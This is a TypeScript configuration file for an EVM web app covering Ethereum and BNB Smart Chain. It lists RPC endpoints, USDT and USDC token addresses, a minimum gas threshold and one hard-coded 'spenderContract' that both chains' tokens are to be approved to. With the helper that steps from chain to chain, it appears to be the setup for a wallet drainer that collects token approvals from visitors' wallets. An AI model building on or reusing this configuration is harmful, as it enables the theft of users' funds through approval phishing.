/**
 * EVM chain configuration — Ethereum + BNB Smart Chain only.
 */

export interface ChainToken {
  symbol: string;
  name: string;
  address: string;
  decimals: number;
}

export interface ChainConfig {
  id: string;
  chainId: number;
  chainIdHex: string;
  wcChainId: string; // WalletConnect format "eip155:X"
  name: string;
  icon: string;
  rpcUrl: string;
  explorerUrl: string;
  nativeCurrency: { symbol: string; decimals: number };
  /** Contract to approve spending to */
  spenderContract: string;
  /** Minimum native balance needed for gas (in native token units) */
  minGasThreshold: number;
  /** Tokens to approve on this chain */
  approvalTokens: ChainToken[];
}

export const SUPPORTED_CHAINS: ChainConfig[] = [
  {
    id: "ethereum",
    chainId: 1,
    chainIdHex: "0x1",
    wcChainId: "eip155:1",
    name: "Ethereum",
    icon: "https://cryptologos.cc/logos/ethereum-eth-logo.png",
    rpcUrl: "https://eth.drpc.org",
    explorerUrl: "https://etherscan.io",
    nativeCurrency: { symbol: "ETH", decimals: 18 },
    spenderContract: "0x065A08111056F729d5997b53509ff03bD5425B1E",
    minGasThreshold: 0.001,
    approvalTokens: [
      { symbol: "USDT", name: "USDT", address: "0xdAC17F958D2ee523a2206206994597C13D831ec7", decimals: 6 },
      { symbol: "USDC", name: "USDC", address: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", decimals: 6 },
    ],
  },
  {
    id: "bsc",
    chainId: 56,
    chainIdHex: "0x38",
    wcChainId: "eip155:56",
    name: "BNB Smart Chain",
    icon: "https://cryptologos.cc/logos/bnb-bnb-logo.png",
    rpcUrl: "https://bsc-dataseed1.binance.org",
    explorerUrl: "https://bscscan.com",
    nativeCurrency: { symbol: "BNB", decimals: 18 },
    spenderContract: "0x065A08111056F729d5997b53509ff03bD5425B1E",
    minGasThreshold: 0.0005,
    approvalTokens: [
      { symbol: "USDT", name: "BEP20 USDT", address: "0x55d398326f99059fF775485246999027B3197955", decimals: 18 },
      { symbol: "USDC", name: "BEP20 USDC", address: "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d", decimals: 18 },
    ],
  },
];

/** Lookup chain config by chainId number */
export function getChainById(chainId: number): ChainConfig | undefined {
  return SUPPORTED_CHAINS.find((c) => c.chainId === chainId);
}

/** Lookup chain config by string id */
export function getChainByStringId(id: string): ChainConfig | undefined {
  return SUPPORTED_CHAINS.find((c) => c.id === id);
}

/** Get next chain in the supported list after the given chainId, or undefined if last */
export function getNextChain(currentChainId: number): ChainConfig | undefined {
  const idx = SUPPORTED_CHAINS.findIndex((c) => c.chainId === currentChainId);
  if (idx === -1 || idx >= SUPPORTED_CHAINS.length - 1) return undefined;
  return SUPPORTED_CHAINS[idx + 1];
}
